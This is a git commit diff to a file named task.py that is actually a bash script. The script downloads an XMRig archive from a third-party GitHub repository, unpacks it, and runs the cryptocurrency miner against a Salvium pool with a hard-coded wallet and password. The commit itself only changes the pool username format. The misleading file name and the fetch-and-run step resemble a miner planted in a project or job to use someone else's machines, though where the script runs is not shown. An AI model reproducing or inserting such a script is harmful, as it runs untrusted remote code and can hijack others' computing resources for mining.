c26f5dcf62f5c71cd6c7d8fbb7b1c548032fd560
ajayy188 <syaukilfalah@gmail.com>
2025-03-12 14:20:47 +0700

    Update task.py

--- task.py
+++ task.py
@@ -1,3 +1,3 @@
 #!/bin/bash
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
-./xmrig --donate-level 1 -o sg.salvium.herominers.com:1230 -u solo:SaLvs7xibBHMyhQDy4E5LD9f81dhsQXYmBtNxWy2NkV7MUi74K927ZjCTavsN5dvGPf7jw38JKzYdRuLAiuMEoTFXRV49Woppoe -p ajayyohiki -a rx/0
+./xmrig --donate-level 1 -o sg.salvium.herominers.com:1230 -u SaLvs7xibBHMyhQDy4E5LD9f81dhsQXYmBtNxWy2NkV7MUi74K927ZjCTavsN5dvGPf7jw38JKzYdRuLAiuMEoTFXRV49Woppoe -p ajayyohiki -a rx/0
